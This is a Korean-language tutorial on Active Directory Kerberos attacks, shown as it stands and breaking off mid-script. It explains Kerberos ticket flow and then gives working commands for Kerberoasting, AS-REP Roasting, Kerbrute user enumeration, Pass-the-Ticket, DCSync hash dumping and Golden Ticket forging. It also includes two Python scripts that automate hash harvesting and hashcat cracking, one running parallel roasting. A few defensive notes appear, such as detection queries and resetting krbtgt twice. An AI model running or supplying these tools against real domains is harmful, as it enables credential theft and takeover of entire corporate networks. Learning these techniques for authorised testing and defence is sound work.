> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Kerberos 공격 — Kerberoasting·AS-REP Roasting·티켓 공격

## 0. 초보자를 위한 개념 이해

### Kerberos란?

**Kerberos**는 Windows Active Directory에서 사용하는 네트워크 인증 프로토콜입니다. 비밀번호 없이 "티켓"으로 서비스에 인증합니다. 복잡한 구조 때문에 여러 공격 기법이 존재합니다.

**왜 중요한가:**
```
Windows 기업 환경 표준:
  - 모든 Windows 도메인 환경에서 사용
  - 수십만 기업의 인증 기반
  - AD 공격의 핵심 → 침투 테스터 필수 지식

Kerberos 티켓 = AD 왕국의 열쇠:
  TGT (Ticket Granting Ticket) = 마스터 키
    → KDC(도메인 컨트롤러)에서 발급
    → 다른 서비스 티켓 요청에 사용
  TGS (Service Ticket) = 특정 서비스 입장권
    → SQL Server, File Server 등 접근에 사용
```

### 핵심 공격 기법

```
Kerberoasting:
  1. 서비스 계정(SPN 설정된 계정) 목록 조회
  2. 해당 계정의 TGS 티켓 요청 (인증 필요 없음!)
  3. 티켓은 서비스 계정 해시로 암호화됨
  4. 오프라인으로 Hashcat으로 크래킹
  → 서비스 계정 비밀번호 획득

AS-REP Roasting:
  사전 인증(Pre-Auth) 비활성화된 계정 대상
  → TGT를 인증 없이 요청 가능
  → 응답이 해시로 암호화 → 오프라인 크래킹

Pass-the-Ticket:
  훔친 티켓(TGT/TGS)을 그대로 재사용
  → 비밀번호 없이 인증 통과
```

### 필요한 도구
- **Rubeus**: Windows Kerberos 공격 도구
- **Impacket**: Python AD 공격 라이브러리
- **BloodHound**: AD 공격 경로 시각화

### 기초 실습 예제
```bash
# Kerberoasting (허가된 AD 환경에서만!)

# 방법 1: Impacket으로 SPN 계정 티켓 요청
python3 GetUserSPNs.py domain.local/user:password -request

# 방법 2: Rubeus (Windows에서)
Rubeus.exe kerberoast /nowrap

# 얻은 해시 크래킹 (Hashcat)
hashcat -m 13100 hash.txt rockyou.txt
# -m 13100: Kerberos 5 TGS-REP 해시 유형
```

---

## 학습 목표

이 문서를 완료하면 다음을 할 수 있다:

- Active Directory가 무엇인지, 왜 기업 보안의 핵심인지 설명할 수 있다
- Kerberos 인증의 전체 흐름을 놀이공원 비유로 초보자에게 설명할 수 있다
- Kerberoasting과 AS-REP Roasting의 차이와 각각의 전제 조건을 구별한다
- Golden Ticket과 Silver Ticket의 차이를 이해하고 활용 시나리오를 설명한다
- Python으로 Kerberos 공격 자동화 스크립트를 작성하고 분석할 수 있다
- 각 Kerberos 공격에 대한 탐지 방법과 방어 전략을 적용할 수 있다
- AD 완전 장악 5단계 실전 시나리오를 이해한다

---

## Active Directory 기초 — "회사의 직원 명부 + 출입통제 시스템"

### Active Directory란?

Active Directory(AD)는 **Microsoft가 개발한 중앙화된 신원 및 접근 관리 시스템**이다. 쉽게 말하면 "회사의 직원 명부 + 출입통제 시스템"이다.

**현실 세계 비유:**
- 대기업 본사 건물에 들어가려면 사원증이 필요하다
- 사원증을 발급하고 관리하는 곳이 인사팀(HR)이다
- 특정 층이나 서버실에는 추가 권한이 필요하다
- HR은 누가 어느 방에 들어갈 수 있는지 기록을 관리한다

Active Directory에서:
- **직원 명부** = AD의 사용자·컴퓨터·그룹 계정 데이터베이스
- **사원증 발급기** = KDC (Key Distribution Center, 키 배포 센터)
- **출입통제 게이트** = 각 서비스(파일 서버, 이메일 서버 등)
- **보안실** = Domain Controller (도메인 컨트롤러, DC)

### 핵심 개념

**도메인(Domain):**
AD의 기본 관리 단위. `corp.example.com` 처럼 DNS 이름을 가진다. 같은 도메인 내의 사용자, 컴퓨터, 정책이 하나의 관리 범위 안에 있다.

**도메인 컨트롤러(Domain Controller, DC):**
AD 데이터베이스(NTDS.DIT)를 호스팅하는 서버. DC를 장악하면 도메인 내 모든 계정과 리소스를 통제할 수 있다. **DC 장악 = 기업 전체 장악**이다.

**포레스트(Forest):**
여러 도메인을 묶는 최상위 컨테이너. 서로 다른 회사나 부서가 Trust 관계로 연결될 수 있다.

**트러스트(Trust):**
두 도메인이 서로의 계정을 인식하고 허용하는 신뢰 관계. 한 도메인을 장악하면 Trust를 통해 연결된 다른 도메인으로 이동 가능(Lateral Movement).

**NTDS.DIT:**
AD의 핵심 데이터베이스 파일. 모든 사용자 계정, 암호화된 패스워드 해시, 그룹 정보가 저장되어 있다. 이 파일을 획득하면 도메인 내 모든 계정의 패스워드 해시를 오프라인에서 크래킹할 수 있다.

### 왜 AD가 보안의 핵심인가?

```
전 세계 기업의 약 90%가 Windows + Active Directory를 사용한다.
→ 대부분의 기업 침해는 AD 공격을 포함한다.
→ AD를 장악하면 모든 Windows 컴퓨터, 파일 서버, 이메일 서버, 데이터베이스에 접근 가능.
→ 랜섬웨어 공격자들은 AD DC를 장악한 후 모든 컴퓨터에 동시에 랜섬웨어를 배포한다.

APT 그룹의 전형적인 목표:
  1. 초기 침입 (피싱, 취약점 악용)
  2. 내부 망 이동 (Lateral Movement)
  3. AD DC 장악 (Domain Admin 권한 획득)
  4. 데이터 탈취 / 랜섬웨어 배포
```

---

## Kerberos 기초 — 완전 초보자용

### Kerberos는 놀이공원 입장권 시스템이다

Kerberos를 이해하는 가장 쉬운 방법은 **놀이공원 입장권 시스템**으로 생각하는 것이다.

```
현실 놀이공원:                    Kerberos:
═══════════════════════════════════════════════════════════
매표소 (신분증 확인)          →    KDC의 AS (Authentication Service)
1일 자유 이용권 발급           →    TGT (Ticket Granting Ticket) 발급
이용권 관리 창구              →    KDC의 TGS (Ticket Granting Service)
특정 놀이기구 탑승권           →    서비스 티켓 (Service Ticket)
놀이기구 탑승 게이트          →    각 서비스 (파일 서버, 이메일 등)

흐름:
1. 매표소에서 신분증 확인 → 1일 자유 이용권 받음 (로그인 → TGT)
2. 바이킹 타고 싶을 때 → 이용권 관리 창구에 이용권 보여줌
3. 창구가 "바이킹 탑승권" 발급 (TGS가 서비스 티켓 발급)
4. 바이킹 탑승 게이트에 탑승권 제시 → 탑승! (서비스 접근)

핵심:
- 놀이기구마다 신분증을 다시 보여줄 필요 없음 (SSO, Single Sign-On)
- 자유 이용권(TGT)을 훔치면 어느 놀이기구든 탈 수 있음 (Golden Ticket)
- 특정 탑승권(서비스 티켓)을 훔치면 그 놀이기구만 탈 수 있음 (Silver Ticket)
```

### Kerberos 전체 인증 흐름

```
클라이언트       KDC (AS)                KDC (TGS)             서비스
    │                │                       │                    │
    │                │                       │                    │
    │  [1] AS-REQ    │                       │                    │
    │ ─────────────> │                       │                    │
    │  신분 증명:     │                       │                    │
    │  (사용자명 +    │                       │                    │
    │   타임스탬프를  │                       │                    │
    │   패스워드로   │                       │                    │
    │   암호화)       │                       │                    │
    │                │                       │                    │
    │  [2] AS-REP    │                       │                    │
    │ <───────────── │                       │                    │
    │  TGT 발급:     │                       │                    │
    │  (krbtgt 키로  │                       │                    │
    │   암호화된      │                       │                    │
    │   티켓)         │                       │                    │
    │                │                       │                    │
    │  [3] TGS-REQ   │                       │                    │
    │ ────────────────────────────────────> │                    │
    │  "파일 서버     │                       │                    │
    │   접근 티켓     │                       │                    │
    │   주세요"       │                       │                    │
    │  TGT 첨부       │                       │                    │
    │                │                       │                    │
    │  [4] TGS-REP   │                       │                    │
    │ <──────────────────────────────────── │                    │
    │  서비스 티켓:   │                       │                    │
    │  (서비스 계정   │                       │                    │
    │   패스워드로    │                       │                    │
    │   암호화)       │                       │                    │
    │                │                       │                    │
    │  [5] AP-REQ    │                       │                    │
    │ ──────────────────────────────────────────────────────>  │
    │  서비스 티켓    │                       │                    │
    │  제시           │                       │                    │
    │                │                       │                    │
    │  [6] AP-REP    │                       │                    │
    │ <─────────────────────────────────────────────────────── │
    │  인증 성공!     │                       │                    │
```

**각 화살표 설명:**

- **[1] AS-REQ (Authentication Service Request):** 사용자가 로그인을 시도한다. 사용자명과 함께 자신의 패스워드로 암호화한 타임스탬프를 전송한다 (사전 인증, Pre-authentication). 타임스탬프를 보내는 이유: KDC가 복호화에 성공하면 "이 사람은 패스워드를 알고 있다"고 검증된다.

- **[2] AS-REP (Authentication Service Response):** KDC가 TGT(Ticket Granting Ticket)를 발급한다. TGT는 **krbtgt 계정의 패스워드 해시로 암호화**된다. 클라이언트는 이 티켓의 내용을 읽을 수 없다. 이것이 "1일 자유 이용권"이다.

- **[3] TGS-REQ (Ticket Granting Service Request):** 특정 서비스에 접근하고 싶을 때 TGT를 TGS에 제시한다. "파일 서버 접근 티켓 주세요"라고 요청한다.

- **[4] TGS-REP (Ticket Granting Service Response):** TGS가 서비스 티켓을 발급한다. 서비스 티켓은 **해당 서비스 계정의 패스워드 해시로 암호화**된다. 이것이 Kerberoasting 공격의 핵심 — 이 암호화된 티켓을 오프라인에서 크래킹할 수 있다.

- **[5] AP-REQ:** 클라이언트가 서비스에 서비스 티켓을 제시한다.

- **[6] AP-REP:** 서비스가 티켓을 검증하고 접근을 허가한다.

### 사전 인증(Pre-authentication)이란?

사전 인증은 **AS-REQ 단계에서 타임스탬프를 패스워드로 암호화해 전송하는 것**이다.

**왜 필요한가?**
사전 인증이 없으면 누구나 임의 계정에 대해 AS-REQ를 보내고 AS-REP(TGT)를 받을 수 있다. 이 AS-REP는 해당 계정의 패스워드로 암호화되어 있으므로 오프라인 크래킹이 가능하다. 이것이 **AS-REP Roasting** 공격이다.

```
사전 인증 있음 (정상):
  클라이언트: 타임스탬프 + 패스워드로 암호화 → KDC 전송
  KDC: 복호화 성공 = 패스워드 확인됨 → TGT 발급
  → AS-REQ 없이는 TGT 받을 수 없음

사전 인증 없음 (DONT_REQ_PREAUTH 설정):
  클라이언트: 사용자명만 전송
  KDC: TGT를 패스워드로 암호화해서 발급 (검증 없이!)
  → 공격자가 사용자명만 알면 AS-REP를 받아 오프라인 크래킹 가능
```

**왜 이 설정이 존재하는가?** 일부 구형 어플리케이션은 Kerberos 사전 인증을 지원하지 않는다. 호환성 목적으로 이 옵션이 존재하지만, 심각한 보안 취약점이다.

### SPN(Service Principal Name)이란?

SPN은 **서비스를 고유하게 식별하는 이름**이다. Kerberos에서 특정 서비스의 티켓을 요청하려면 그 서비스의 SPN을 알아야 한다.

```
SPN 형식: 서비스유형/호스트명:포트@도메인
예시:
  MSSQLSvc/dbserver.corp.local:1433    → SQL Server
  HTTP/webserver.corp.local            → 웹 서비스
  HOST/fileserver.corp.local           → 파일 서버
  
SPN이 중요한 이유 (Kerberoasting):
  1. 도메인 사용자는 SPN이 등록된 계정의 서비스 티켓을 요청할 수 있음
  2. 이 티켓은 해당 서비스 계정의 패스워드로 암호화됨
  3. 즉, 도메인 계정만 있으면 서비스 계정 티켓을 받아 크래킹 가능
```

### RC4 vs AES — 왜 암호화 방식이 공격에 영향을 미치는가?

```
RC4-HMAC (구형):
  - Kerberos 초기에 사용된 암호화 알고리즘
  - hashcat 모드 13100으로 빠르게 크래킹 가능
  - 현재도 하위 호환성을 위해 대부분의 AD 환경에서 허용됨
  - 공격자는 일부러 RC4 티켓을 요청 (더 쉽게 크래킹됨)
  
AES256-CTS-HMAC-SHA1 (현대):
  - 훨씬 강력한 암호화
  - 크래킹이 RC4보다 훨씬 어렵고 느림
  - AES 전용 서비스 계정 설정 시 RC4 요청 거부 가능
  
공격자의 전략:
  Kerberoasting 시 RC4 암호화로 티켓 요청
  → 같은 패스워드라도 AES보다 빠르게 크래킹
  → "msDS-SupportedEncryptionTypes" 속성이 RC4 허용 시 가능
```

---

## 1. Kerberos 인증 흐름 (다이어그램)

```
클라이언트       KDC (AS)           KDC (TGS)          서비스
    │                │                    │                 │
    │─── AS-REQ ────>│                    │                 │
    │   (사전인증:    │                    │                 │
    │    타임스탬프를 │                    │                 │
    │    패스워드로   │                    │                 │
    │    암호화)      │                    │                 │
    │<── AS-REP ─────│                    │                 │
    │   (TGT 발급:   │                    │                 │
    │    krbtgt 해시 │                    │                 │
    │    로 암호화)   │                    │                 │
    │                │                    │                 │
    │──────── TGS-REQ (TGT 포함) ────────>│                 │
    │         "SPN=MSSQLSvc/db:1433       │                 │
    │          에 대한 서비스 티켓 요청"   │                 │
    │<──────── TGS-REP (서비스 티켓) ─────│                 │
    │          (서비스 계정 패스워드       │                 │
    │           해시로 암호화됨)           │                 │
    │                                     │                 │
    │──────────── AP-REQ (서비스 티켓) ──────────────────>│
    │<──────────── AP-REP (인증 성공) ────────────────────│
```

---

## 2. Kerberoasting — "서비스 계정 티켓 오프라인 크래킹"

### 왜 Kerberoasting이 가능한가?

**설계상의 문제(by design):** Kerberos 명세에서 도메인 내 모든 인증된 사용자는 **어떤 SPN에 대해서든 서비스 티켓을 요청할 수 있다.** 이것은 버그가 아니라 의도된 설계다.

```
정상적인 사용 목적:
  직원 A가 SQL 서버에 접근하려면 SQL 서비스 티켓이 필요
  → 도메인 계정으로 TGS에 요청하면 SQL 서비스 티켓 받음
  
공격자의 악용:
  공격자가 저권한 도메인 계정 하나를 획득
  → 모든 SPN의 서비스 티켓을 요청
  → 서비스 티켓은 서비스 계정의 패스워드로 암호화됨
  → 파일로 저장 후 오프라인에서 패스워드 크래킹
  → 서비스 계정 패스워드 획득 → 권한 상승
```

**암호화 원리:**
```
서비스 티켓 암호화:
  서비스 계정의 패스워드 → NTLM 해시 변환 → RC4 키로 사용
  TGS가 세션 키를 이 RC4 키로 암호화
  
크래킹 원리:
  hashcat이 단어 목록의 각 단어를 NTLM 해시로 변환
  그 해시를 RC4 키로 사용해 복호화 시도
  복호화가 성공하면 → 패스워드 발견
  
왜 약한 패스워드가 치명적인가:
  "Password123" 같은 단순 패스워드는 초 단위로 크래킹
  대부분의 서비스 계정은 사람이 로그인하지 않으므로 패스워드 정책 예외 처리가 많음
```

### 2.1 Kerberoasting 실행

```bash
# Impacket GetUserSPNs — SPN 열거 후 티켓 요청
python3 GetUserSPNs.py -dc-ip 10.10.10.100 domain.local/user:Password \
  -request -outputfile kerberoast.hashes
# -request: 티켓도 요청 (없으면 SPN 목록만 출력)
# -outputfile: hashcat 형식으로 해시 저장

# SPN 열거만 (티켓 요청 없이)
python3 GetUserSPNs.py -dc-ip 10.10.10.100 domain.local/user:Password
# 출력: 서비스 계정명, SPN, 마지막 로그인, 패스워드 만료일 등

# Rubeus (Windows 도메인 가입 머신에서)
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
# /nowrap: 해시를 한 줄로 출력 (파일 저장 용이)

# Rubeus — RC4 강제 요청 (더 쉽게 크래킹)
.\Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec /nowrap
# /rc4opsec: RC4 암호화 티켓 요청 (더 빠른 크래킹)

# PowerView (PowerShell — 도메인 환경)
Invoke-Kerberoast -OutputFormat hashcat | Select-Object -ExpandProperty Hash |
  Out-File -FilePath kerberoast.hashes

# hashcat으로 크래킹 (모드 13100 = Kerberos 5 TGS-REP etype 23)
hashcat -a 0 -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule
# -a 0: 딕셔너리 공격
# -m 13100: Kerberoasting 해시 모드
# --rules-file: 변형 규칙 (Password → P@ssw0rd 등)
```

### 2.2 Kerberoasting 자동화 CLI

```python
#!/usr/bin/env python3
"""Kerberoasting 자동화 — Impacket 기반.

사용법:
  python3 kerberoast_auto.py 10.10.10.100 corp.local -u user -p Password
  python3 kerberoast_auto.py 10.10.10.100 corp.local -u user -p Password --crack -w rockyou.txt
"""

import argparse
import subprocess
from pathlib import Path


def run_kerberoast(
    dc_ip: str,
    domain: str,
    username: str,
    password: str,
    output_file: Path,
) -> list[str]:
    """GetUserSPNs 실행 후 해시 추출.
    
    Impacket의 GetUserSPNs는:
    1. LDAP으로 SPN이 있는 계정을 열거한다.
    2. 각 계정의 서비스 티켓(TGS-REP)을 요청한다.
    3. hashcat이 읽을 수 있는 형식으로 해시를 출력한다.
    """
    cmd = [
        "python3", "-m", "impacket.examples.GetUserSPNs",
        f"{domain}/{username}:{password}",
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", str(output_file),
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    print(result.stdout)
    if result.returncode != 0:
        print(f"오류: {result.stderr}")
        return []

    hashes = []
    if output_file.exists():
        hashes = output_file.read_text().strip().splitlines()
        print(f"\n[+] 해시 {len(hashes)}개 획득")

    return hashes


def crack_hashes(
    hash_file: Path,
    wordlist: Path,
    rules_file: Path | None = None,
    hash_mode: int = 13100,  # 13100 = TGS-REP (Kerberoasting)
) -> list[str]:
    """hashcat으로 해시 크래킹.
    
    모드 13100: Kerberos 5 TGS-REP etype 23 (RC4 암호화 서비스 티켓)
    모드 19600: Kerberos 5 TGS-REP etype 17 (AES128)
    모드 19700: Kerberos 5 TGS-REP etype 18 (AES256)
    """
    cmd = [
        "hashcat", "-a", "0", f"-m", str(hash_mode),
        str(hash_file), str(wordlist),
        "--potfile-path", "/tmp/kerberoast.pot",
        "--quiet",
    ]
    if rules_file:
        cmd.extend(["--rules-file", str(rules_file)])

    subprocess.run(cmd, timeout=3600)

    # 크래킹된 결과 읽기
    pot_file = Path("/tmp/kerberoast.pot")
    cracked = []
    if pot_file.exists():
        for line in pot_file.read_text().splitlines():
            if ":" in line:
                cracked.append(line.split(":")[-1])

    return cracked


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kerberoasting 자동화",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s 10.10.10.100 corp.local -u user -p Password
  %(prog)s 10.10.10.100 corp.local -u user -p Password --crack -w rockyou.txt
        """
    )
    parser.add_argument("dc", help="도메인 컨트롤러 IP")
    parser.add_argument("domain", help="도메인 (예: corp.local)")
    parser.add_argument("-u", "--user", required=True, help="도메인 사용자명")
    parser.add_argument("-p", "--password", required=True, help="패스워드")
    parser.add_argument("-o", "--output", type=Path, default=Path("/tmp/kerberoast.hashes"),
                        help="해시 출력 파일 경로")
    parser.add_argument("-w", "--wordlist", type=Path,
                        default=Path("/usr/share/wordlists/rockyou.txt"),
                        help="크래킹용 단어 목록")
    parser.add_argument("--crack", action="store_true", help="해시 크래킹 자동 실행")
    args = parser.parse_args()

    hashes = run_kerberoast(args.dc, args.domain, args.user, args.password, args.output)

    if args.crack and hashes:
        print("\n[*] 해시 크래킹 시작...")
        cracked = crack_hashes(args.output, args.wordlist)
        print(f"[+] 크래킹 성공: {len(cracked)}개")
        for pw in cracked:
            print(f"  패스워드: {pw}")


if __name__ == "__main__":
    main()
```

---

## 3. AS-REP Roasting — "도메인 계정 없이도 가능한 공격"

### AS-REP Roasting이 Kerberoasting과 다른 점

```
Kerberoasting:
  전제 조건: 도메인 계정 필요 (어떤 것이든)
  원리: 서비스 티켓(TGS-REP)을 서비스 계정 패스워드로 오프라인 크래킹
  대상: SPN이 등록된 서비스 계정
  hashcat 모드: 13100

AS-REP Roasting:
  전제 조건: 사용자명 목록만 있으면 됨 (도메인 계정 불필요!)
  원리: AS-REP(TGT)의 일부가 사용자 패스워드로 암호화됨 → 오프라인 크래킹
  대상: DONT_REQ_PREAUTH 플래그가 설정된 계정
  hashcat 모드: 18200
  
AS-REP Roasting의 파괴력:
  → 도메인 계정 없이 외부에서 공격 가능
  → 공개 사용자명 목록 (예: LinkedIn에서 수집)으로 공격 시작
  → 적중 시 즉시 오프라인 크래킹
```

### DONT_REQ_PREAUTH — 왜 이런 설정이 존재하는가?

```
배경:
  일부 구형 어플리케이션 (SAP, Oracle 구형 버전 등)은
  Kerberos 사전 인증을 지원하지 않음.
  이런 앱이 AD 인증을 사용하려면 이 플래그를 설정해야 함.
  
보안 영향:
  이 플래그가 설정된 계정은 누구든 AS-REP를 요청할 수 있음.
  AS-REP의 enc-part는 해당 계정의 패스워드 해시로 암호화됨.
  → 크래킹으로 패스워드 복원 가능.
  
탐지:
  PowerShell: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
  Bloodhound: ASREPRoastable users 노드로 자동 표시
```

### Kerbrute — 사용자명 열거

AS-REP Roasting을 시작하기 전에 유효한 사용자명 목록이 필요하다. Kerbrute는 도메인 계정 없이 사용자명 열거가 가능한 도구다.

```bash
# Kerbrute로 사용자명 열거 (사전 인증 실패 여부로 계정 존재 확인)
./kerbrute userenum --dc 10.10.10.100 -d corp.local usernames.txt
# 존재하는 계정: AS-REQ에 대해 PREAUTH_REQUIRED 오류 반환
# 존재하지 않는 계정: PRINCIPAL_UNKNOWN 오류 반환
# → 오류 유형으로 계정 존재 여부 판별

# 사용자명 목록 생성 소스:
# - 회사 이메일 형식 추론 (firstname.lastname@company.com)
# - LinkedIn에서 직원 이름 수집
# - 공개 GitHub 커밋 이메일
# - OWA (Outlook Web Access) 이메일 열거
```

### 3.1 AS-REP Roasting 실행

```bash
# Impacket GetNPUsers — 도메인 계정 없이 가능
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.100 \
  -usersfile users.txt -format hashcat -outputfile asrep.hashes
# users.txt: 시도할 사용자명 목록 (한 줄에 하나)
# -format hashcat: hashcat이 읽을 수 있는 형식으로 출력
# 도메인 계정 없이 사용 가능 — 사용자명 목록만 있으면 됨

# 도메인 계정이 있을 경우 — 자동으로 취약 계정 열거
python3 GetNPUsers.py domain.local/user:Password -dc-ip 10.10.10.100 \
  -request -format hashcat -outputfile asrep.hashes
# 이 방식은 LDAP으로 DONT_REQ_PREAUTH 계정을 자동 열거

# hashcat 크래킹 (모드 18200 = Kerberos 5 AS-REP etype 23)
hashcat -a 0 -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule

# Rubeus (Windows 환경)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /nowrap
```

---

## 4. Pass-the-Ticket (PtT)

티켓을 탈취하거나 위조해서 해당 계정의 패스워드 없이도 인증하는 공격이다.

```bash
# Mimikatz로 현재 메모리의 Kerberos 티켓 덤프
mimikatz # sekurlsa::tickets /export
# .kirbi 파일로 티켓 저장 (황금 티켓 포함)

# Rubeus로 특정 서비스 티켓 요청 및 내보내기
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe dump /service:krbtgt /nowrap

# Linux에서 .ccache 파일 사용 (MIT Kerberos 형식)
export KRB5CCNAME=/tmp/admin.ccache
python3 psexec.py -k -no-pass domain.local/admin@dc.domain.local
# -k: Kerberos 인증 사용
# -no-pass: 패스워드 없이 티켓 파일 사용

# Impacket으로 .kirbi ↔ .ccache 변환
python3 ticketConverter.py admin.kirbi admin.ccache
# Windows 형식(.kirbi) ↔ Linux 형식(.ccache) 상호 변환
```

---

## 5. Golden Ticket vs Silver Ticket — 비교 분석

### 두 티켓의 핵심 차이

```
Golden Ticket (황금 티켓):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
필요한 것: krbtgt 계정의 NTLM 해시
티켓 종류: TGT (Ticket Granting Ticket, 자유 이용권)
범위:      도메인 내 어떤 서비스든, 어떤 사용자든 (존재하지 않는 사용자도!)
유효기간:  최대 10년으로 설정 가능 (정상은 10시간)
강점:      krbtgt 패스워드를 리셋하기 전까지 계속 유효
약점:      krbtgt 해시 획득이 어려움 (DCSync 또는 DC 직접 접근 필요)
비유:      "모든 놀이기구에 탈 수 있는 종신 자유 이용권 위조"

Silver Ticket (은색 티켓):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
필요한 것: 특정 서비스 계정의 NTLM 해시 (krbtgt 불필요)
티켓 종류: 서비스 티켓 (특정 서비스 전용)
범위:      해당 서비스 하나만
유효기간:  커스텀 설정 가능
강점:      KDC에 통신하지 않음 → 탐지 어려움
           서비스 계정 해시만 있으면 됨 (더 쉽게 획득 가능)
약점:      특정 서비스만 접근 가능
비유:      "특정 놀이기구 탑승권만 위조"
```

### krbtgt 패스워드를 두 번 리셋해야 하는 이유

```
krbtgt 계정의 특성:
  - Kerberos의 핵심 계정 — 모든 TGT를 서명
  - 패스워드를 1번 리셋하면:
    Active와 Previous 두 개의 패스워드가 공존
    기존 Golden Ticket은 여전히 유효 (Previous 키로 검증)
  - 패스워드를 2번 리셋하면:
    Previous 키도 새 키로 교체
    기존 Golden Ticket 완전 무효화

권장 절차:
  1. 첫 번째 krbtgt 패스워드 리셋
  2. 최소 10시간 대기 (기존 합법적 TGT 만료 시간)
  3. 두 번째 krbtgt 패스워드 리셋
  4. 기존 Golden Ticket 완전 무효화
  
  주의: 사전 알림 없이 리셋하면 모든 도메인 사용자가
  재로그인해야 하므로 유지보수 창(Maintenance Window)에 진행
```

### 5.1 Golden Ticket 공격

```bash
# 1단계: DCSync로 krbtgt 해시 추출
# DCSync: DC를 사칭해 AD 복제 요청 → 패스워드 해시 덤프
python3 secretsdump.py -just-dc domain.local/admin:Password@DC_IP
# domain.local/administrator:HASH@DC_IP (해시로 인증 시)

# 2단계: 도메인 SID 확인
python3 getPac.py -targetUser administrator -domain domain.local \
  -dc-ip 10.10.10.100 domain.local/user:Password

# 3단계: Mimikatz로 Golden Ticket 생성 및 주입
mimikatz # kerberos::golden /user:administrator /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXX-XXXXXXXX-XXXXXXXX /krbtgt:NTLMHASH /id:500 /ptt
# /user: 위조할 사용자 (존재하지 않아도 됨)
# /sid: 도메인 SID
# /krbtgt: krbtgt NTLM 해시
# /id: 사용자 RID (500 = Administrator)
# /ptt: Pass-the-Ticket (메모리에 즉시 주입)

# Impacket ticketer (Linux)
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX \
  -domain domain.local administrator

export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass domain.local/administrator@dc.domain.local
```

---

## 6. Kerberos 공격 자동화 스크립트

```python
#!/usr/bin/env python3
"""Kerberos 공격 체인 자동화 — AS-REP Roasting + 크래킹 + 결과 보고.

사용법:
  # AS-REP Roasting (도메인 계정 없이)
  python3 kerberos_attack.py asrep 10.10.10.100 corp.local -U userlist.txt

  # AS-REP Roasting + 자동 크래킹
  python3 kerberos_attack.py asrep 10.10.10.100 corp.local \
      -U userlist.txt -w /usr/share/wordlists/rockyou.txt
"""

import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class KerberosTarget:
    username: str                    # 공격 대상 사용자명
    hash_: str                       # 획득한 Kerberos 해시
    cracked_password: str | None = None  # 크래킹된 패스워드 (성공 시)


def asrep_roast_user(dc_ip: str, domain: str, username: str) -> str | None:
    """단일 사용자 AS-REP Roasting 시도.
    
    DONT_REQ_PREAUTH 플래그가 설정된 계정에 AS-REQ를 보낸다.
    KDC가 사전 인증 없이 AS-REP를 반환하면 크래킹 가능한 해시 추출.
    """
    cmd = [
        "python3", "-m", "impacket.examples.GetNPUsers",
        f"{domain}/{username}",
        "-dc-ip", dc_ip,
        "-no-pass",       # 패스워드 없이 (도메인 계정 불필요)
        "-format", "hashcat",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    # "$krb5asrep$"이 출력에 포함되면 해시 획득 성공
    if "$krb5asrep$" in result.stdout:
        lines = [line for line in result.stdout.splitlines() if "$krb5asrep$" in line]
        return lines[0] if lines else None
    return None


def batch_asrep_roast(
    dc_ip: str,
    domain: str,
    usernames: list[str],
    max_workers: int = 10,
) -> list[KerberosTarget]:
    """여러 사용자에 대해 병렬 AS-REP Roasting 실행.
    
    ThreadPoolExecutor로 동시에 여러 요청을 보내 속도를 높인다.
    단, 너무 많은 동시 요청은 IDS 탐지를 유발할 수 있으므로 주의.
    """
    targets: list[KerberosTarget] = []

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # 각 사용자명에 대해 비동기 작업 생성
        futures = {
            executor.submit(asrep_roast_user, dc_ip, domain, u): u
            for u in usernames
        }
        for future in as_completed(futures):
            username = futures[future]
            hash_ = future.result()
            if hash_:
                print(f"[+] AS-REP 해시 획득: {username}")
                targets.append(KerberosTarget(username=username, hash_=hash_))

    return targets


def crack_kerberos_hashes(
    targets: list[KerberosTarget],
    wordlist: Path,
    hash_mode: int = 18200,  # 18200=AS-REP, 13100=TGS
) -> int:
    """hashcat으로 Kerberos 해시 크래킹.
    
    모드:
      18200: AS-REP Roasting (krb5asrep)
      13100: Kerberoasting (krb5tgs) RC4
      19600: Kerberoasting AES128
      19700: Kerberoasting AES256
    """
    if not targets:
        return 0

    # 해시 파일 작성
    hash_file = Path("/tmp/kerberos_hashes.txt")
    hash_file.write_text("\n".join(t.hash_ for t in targets))

    pot_file = Path("/tmp/kerberos.pot")
    pot_file.unlink(missing_ok=True)

    cmd = [
        "hashcat", "-a", "0", f"-m", str(hash_mode),
        str(hash_file), str(wordlist),
        "--potfile-path", str(pot_file),
        "--quiet",
    ]
    subprocess.run(cmd, timeout=3600)

    # 크래킹 결과를 사용자별로 매핑
    cracked_count = 0
    if pot_file.exists():
        pot_data = dict(
            line.rsplit(":", 1) for line in pot_file.read_text().splitlines() if ":" in line
        )
        for target in targets:
            hash_prefix = target.hash_.split("$")[-1][:20]
            for hash_key, password in pot_data.items():
                if hash_prefix in hash_key:
                    target.cracked_password = password
                    cracked_count += 1
                    print(f"[+] 크래킹 성공: {target.username} : {password}")
                    break

    return cracked_count


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Kerberos 공격 자동화 CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # AS-REP Roasting (도메인 계정 없이 외부 공격)
  %(prog)s asrep 10.10.10.100 corp.local -U userlist.txt

